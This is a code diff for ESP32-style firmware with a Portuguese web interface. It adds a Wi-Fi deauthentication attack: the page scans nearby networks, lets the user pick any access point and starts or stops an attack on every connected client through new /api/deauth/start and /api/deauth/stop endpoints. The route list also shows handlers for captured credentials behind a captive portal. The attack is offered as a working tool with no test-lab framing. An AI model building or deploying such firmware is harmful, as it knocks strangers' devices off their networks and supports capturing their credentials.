@@ -9,6 +9,7 @@
 #include <time.h>
 
 #include "app_state.h"
+#include "deauther.h"
 
 namespace
 {
@@ -86,7 +87,9 @@ namespace
     screen3Enabled = doc["screen3_enabled"] | screen3Enabled;
     screen4Enabled = doc["screen4_enabled"] | screen4Enabled;
     screen5Enabled = doc["screen5_enabled"] | screen5Enabled;
-    screen6Enabled = doc["screen6_enabled"] | screen6Enabled;
+    deautherApMac = doc["deauther_ap_mac"] | deautherApMac;
+    deautherClientMac = doc["deauther_client_mac"] | deautherClientMac;
+    deautherChannel = doc["deauther_channel"] | deautherChannel;
   }
 
   bool saveWiFiConfig()
@@ -107,7 +110,9 @@ namespace
     doc["screen3_enabled"] = screen3Enabled;
     doc["screen4_enabled"] = screen4Enabled;
     doc["screen5_enabled"] = screen5Enabled;
-    doc["screen6_enabled"] = screen6Enabled;
+    doc["deauther_ap_mac"] = deautherApMac;
+    doc["deauther_client_mac"] = deautherClientMac;
+    doc["deauther_channel"] = deautherChannel;
 
     File file = LittleFS.open(wifiConfigPath, "w");
     if (!file)
@@ -556,6 +561,45 @@ namespace
       }
     }
     return true;
+  }
+
+  void handleApiDeauthStart()
+  {
+    String apMac = server.arg("ap_mac");
+    String clientMac = server.arg("client_mac");
+    int channel = parseIntBounded(server.arg("channel"), 1, 14, 1);
+
+    if (apMac.length() == 0 || clientMac.length() == 0)
+    {
+      server.send(400, "application/json; charset=utf-8", "{\"error\":\"AP MAC and Client MAC required\"}");
+      return;
+    }
+
+    deautherApMac = apMac;
+    deautherClientMac = clientMac;
+    deautherChannel = channel;
+    saveWiFiConfig();
+
+    toggleDeauther();
+
+    JsonDocument doc;
+    doc["success"] = true;
+    doc["message"] = "Deauther started";
+    String payload;
+    serializeJson(doc, payload);
+    server.send(200, "application/json; charset=utf-8", payload);
+  }
+
+  void handleApiDeauthStop()
+  {
+    toggleDeauther();
+
+    JsonDocument doc;
+    doc["success"] = true;
+    doc["message"] = "Deauther stopped";
+    String payload;
+    serializeJson(doc, payload);
+    server.send(200, "application/json; charset=utf-8", payload);
   }
 
   void handleApiScanJson()
@@ -1009,41 +1053,49 @@ namespace
     page += "<meta name='viewport' content='width=device-width,initial-scale=1'>";
 
     page += "<script>";
-    // Função para escanear redes
-    page += "async function loadNetworks() {";
-    page += "  var el = document.getElementById('networksList');";
-    page += "  el.innerHTML = '<p class=\"muted\">Escaneando redes...</p>';";
-    page += "  try {";
-    page += "    var r = await fetch('/api/scan');";
-    page += "    var j = await r.json();";
-    page += "    if(!j.networks || j.networks.length === 0) {";
-    page += "      el.innerHTML = '<p class=\"muted\">Nenhuma rede encontrada.</p>'; return;";
-    page += "    }";
-    page += "    var html = '<table style=\"width:100%;font-size:13px;border-collapse:collapse\">';";
-    page += "    html += '<tr><th>SSID</th><th>Ch</th><th>dBm</th><th>BSSID</th><th>Ação</th></tr>';";
-    page += "    for(var i = 0; i < j.networks.length; i++) {";
-    page += "      var n = j.networks[i];";
-    page += "      html += '<tr><td>' + labEsc(n.ssid||'(oculto)') + '</td><td>' + n.channel + '</td><td>' + n.rssi + '</td>';";
-    page += "      html += '<td style=\"font-family:monospace\">' + labEsc(n.bssid) + '</td>';";
-    page += "      html += '<td><button onclick=\"deauthAllClients(\\'' + n.bssid + '\\')\" style=\"background:#ff4757;color:white;padding:6px 12px;border:none;border-radius:6px;cursor:pointer\">Atacar Todos</button></td></tr>';";
-    page += "    }";
-    page += "    html += '</table>';";
-    page += "    el.innerHTML = html;";
-    page += "  } catch(e) { el.innerHTML = '<p class=\"bad\">Falha no scan.</p>'; }";
-    page += "}";
-
-    // Função para atacar TODOS os clientes de uma rede (sem precisar digitar MAC)
-    page += "async function deauthAllClients(apBssid) {";
-    page += "  if(!confirm('Tem certeza que quer desconectar TODOS os dispositivos desta rede?\\n\\nAP: ' + apBssid)) return;";
-    page += "  var url = '/api/deauth?ap=' + encodeURIComponent(apBssid) + '&client=FF:FF:FF:FF:FF:FF&reason=7';";
-    page += "  try {";
-    page += "    var r = await fetch(url);";
-    page += "    var j = await r.json();";
-    page += "    alert('🚀 Ataque iniciado contra todos os clientes da rede!\\nAP: ' + apBssid);";
-    page += "  } catch(e) { alert('❌ Erro ao enviar deauth'); }";
-    page += "}";
-
     page += "function labEsc(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/\"/g,'&quot;');}";
+    page += "let selectedApMac = '', selectedChannel = 0;";
+    page += "async function loadNetworks(){";
+    page += "  const btn = event.target; btn.disabled = true; btn.innerText = 'Buscando...';";
+    page += "  try{";
+    page += "    const r = await fetch('/api/scan');";
+    page += "    const j = await r.json();";
+    page += "    let html = '<div style=\"display:flex;flex-direction:column;gap:8px;margin-top:8px\">';";
+    page += "    j.networks.forEach(n => {";
+    page += "      const ssid = labEsc(n.ssid || '(oculto)');";
+    page += "      const bssid = n.bssid;";
+    page += "      const rssi = n.rssi;";
+    page += "      const ch = n.channel;";
+    page += "      html += `<div style=\"background:#262626;padding:12px;border-radius:6px;cursor:pointer;border-left:3px solid #00a6ff\" onclick=\"selectNetwork('${bssid}', '${ssid}', ${ch})\">`;";
+    page += "      html += `<div style=\"font-weight:bold\">${ssid}</div>`;";
+    page += "      html += `<div style=\"font-size:12px;color:#aaa\">MAC: ${bssid} | Canal: ${ch} | RSSI: ${rssi} dBm</div>`;";
+    page += "      html += '</div>';";
+    page += "    });";
+    page += "    html += '</div>';";
+    page += "    document.getElementById('networksList').innerHTML = html;";
+    page += "  }catch(e){alert('Erro ao buscar redes');}";
+    page += "  btn.disabled = false; btn.innerText = 'Buscar Redes Wi-Fi';";
+    page += "}";
+    page += "function selectNetwork(bssid, ssid, ch){";
+    page += "  selectedApMac = bssid;";
+    page += "  selectedChannel = ch;";
+    page += "  document.getElementById('selectedTarget').innerText = `${ssid} (${bssid}) - Canal ${ch}`;";
+    page += "  document.getElementById('deautherControls').style.display = 'block';";
+    page += "}";
+    page += "async function startDeauth(){";
+    page += "  try{";
+    page += "    const r = await fetch('/api/deauth/start', {method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:`ap_mac=${encodeURIComponent(selectedApMac)}&client_mac=FF:FF:FF:FF:FF:FF&channel=${selectedChannel}`});";
+    page += "    const j = await r.json();";
+    page += "    alert(j.message);";
+    page += "  }catch(e){alert('Erro ao iniciar ataque');}";
+    page += "}";
+    page += "async function stopDeauth(){";
+    page += "  try{";
+    page += "    const r = await fetch('/api/deauth/stop', {method:'POST'});";
+    page += "    const j = await r.json();";
+    page += "    alert(j.message);";
+    page += "  }catch(e){alert('Erro ao parar ataque');}";
+    page += "}";
     page += "</script>";
 
     page += "<style>body{font-family:Arial,sans-serif;background:#111;color:#eee;max-width:560px;margin:0 auto;padding:20px}";
@@ -1082,22 +1134,23 @@ namespace
     page += "<label><input name='screen1_enabled' type='checkbox'" + String(screen1Enabled ? " checked" : "") + "> Wi-Fi / Status</label>";
     page += "<label><input name='screen3_enabled' type='checkbox'" + String(screen3Enabled ? " checked" : "") + "> Hora</label>";
     page += "<label><input name='screen4_enabled' type='checkbox'" + String(screen4Enabled ? " checked" : "") + "> Instagram</label>";
-    page += "<label><input name='screen5_enabled' type='checkbox'" + String(screen5Enabled ? " checked" : "") + "> Scanner Wi-Fi (somente leitura)</label>";
-    page += "<label><input name='screen6_enabled' type='checkbox'" + String(screen6Enabled ? " checked" : "") + "> Deauther Wi-Fi</label>";
+    page += "<label><input name='screen5_enabled' type='checkbox'" + String(screen5Enabled ? " checked" : "") + "> Deauther Wi-Fi</label>";
     page += "<p class='muted'>A tela do olho sempre fica ativa.</p>";
     page += "<label><input name='captive_portal' type='checkbox'" + String(captivePortalEnabled ? " checked" : "") + "> Ativar captive portal</label>";
     page += "<button type='submit'>Salvar e conectar</button></form>";
     page += "</div>";
 
-    // ==================== DEAUTHER SIMPLES (o que você quer) ====================
+    // Configuração do Deauther
     page += "<div class='card'>";
-    page += "<h3>🔥 WiFi Deauther - Ataque Rápido</h3>";
-    page += "<p class='muted'>Escaneie as redes e clique em 'Atacar Todos' na rede desejada.<br>Isso desconecta todos os dispositivos conectados nela.</p>";
-
-    page += "<button onclick='loadNetworks()' style='background:#00a6ff;margin-bottom:15px'>📡 Escanear Redes Próximas</button>";
-
-    page += "<div id='networksList' style='max-height:320px;overflow-y:auto;'></div>";
-
+    page += "<h3>Deauther Wi-Fi</h3>";
+    page += "<p class='muted'>Busque redes Wi-Fi proximas e selecione um alvo para ataque de deautenticação.</p>";
+    page += "<button onclick='loadNetworks()'>Buscar Redes Wi-Fi</button>";
+    page += "<div id='networksList' style='margin-top:12px;'></div>";
+    page += "<div id='deautherControls' style='margin-top:12px;display:none;'>";
+    page += "<p><strong>Alvo selecionado:</strong> <span id='selectedTarget'>-</span></p>";
+    page += "<button onclick='startDeauth()'>Iniciar Ataque</button>";
+    page += "<button onclick='stopDeauth()' style='background:#8b2d2d;margin-left:8px;'>Parar Ataque</button>";
+    page += "</div>";
     page += "</div>";
 
     // Seções restantes (mantidas)
@@ -1161,7 +1214,9 @@ namespace
     doc["screen3_enabled"] = screen3Enabled;
     doc["screen4_enabled"] = screen4Enabled;
     doc["screen5_enabled"] = screen5Enabled;
-    doc["screen6_enabled"] = screen6Enabled;
+    doc["deauther_ap_mac"] = deautherApMac;
+    doc["deauther_client_mac"] = deautherClientMac;
+    doc["deauther_channel"] = deautherChannel;
 
     String payload;
     serializeJson(doc, payload);
@@ -1181,13 +1236,15 @@ namespace
     bool newScreen3Enabled = server.hasArg("screen3_enabled");
     bool newScreen4Enabled = server.hasArg("screen4_enabled");
     bool newScreen5Enabled = server.hasArg("screen5_enabled");
-    bool newScreen6Enabled = server.hasArg("screen6_enabled");
+    String newDeautherApMac = server.arg("deauther_ap_mac");
+    String newDeautherClientMac = server.arg("deauther_client_mac");
+    int newDeautherChannel = parseIntBounded(server.arg("deauther_channel"), 1, 14, deautherChannel);
     unsigned long weatherSec = parseULongBounded(server.arg("weather_sec"), 10, 3600, weatherUpdateIntervalMs / 1000);
     unsigned long screenSec = parseULongBounded(server.arg("screen_sec"), 2, 120, screenChangeIntervalMs / 1000);
     int newTz = parseIntBounded(server.arg("tz"), -12, 14, timezoneOffsetHours);
     int newBrightness = parseIntBounded(server.arg("brightness"), 0, 255, oledBrightness);
 
-    if (!newScreen1Enabled && !newScreen2Enabled && !newScreen3Enabled && !newScreen4Enabled && !newScreen5Enabled && !newScreen6Enabled)
+    if (!newScreen1Enabled && !newScreen2Enabled && !newScreen3Enabled && !newScreen4Enabled && !newScreen5Enabled)
     {
       server.send(400, "text/plain; charset=utf-8", "Ative pelo menos uma pagina adicional");
       return;
@@ -1224,7 +1281,9 @@ namespace
     screen3Enabled = newScreen3Enabled;
     screen4Enabled = newScreen4Enabled;
     screen5Enabled = newScreen5Enabled;
-    screen6Enabled = newScreen6Enabled;
+    deautherApMac = newDeautherApMac;
+    deautherClientMac = newDeautherClientMac;
+    deautherChannel = newDeautherChannel;
     setCaptivePortalEnabled(newCaptivePortalEnabled);
 
     applyDisplayAndTimeSettings();
@@ -1263,8 +1322,10 @@ namespace
     server.on("/fwlink", HTTP_GET, handleCaptiveRedirect);
     server.on("/status", HTTP_GET, handleStatusPage);
     server.on("/api/status", HTTP_GET, handleStatusJson);
-    server.on("/api/scan", HTTP_GET, handleApiScanJson);
     server.on("/api/router-lab", HTTP_POST, handleRouterLabSend);
+    server.on("/api/scan", HTTP_GET, handleApiScanJson);
+    server.on("/api/deauth/start", HTTP_POST, handleApiDeauthStart);
+    server.on("/api/deauth/stop", HTTP_POST, handleApiDeauthStop);
     server.on("/save", HTTP_POST, handleSave);
     server.on("/credentials/delete", HTTP_POST, handleDeleteCapturedCredential);
     server.on("/credentials/clear", HTTP_POST, handleClearCapturedCredentials);
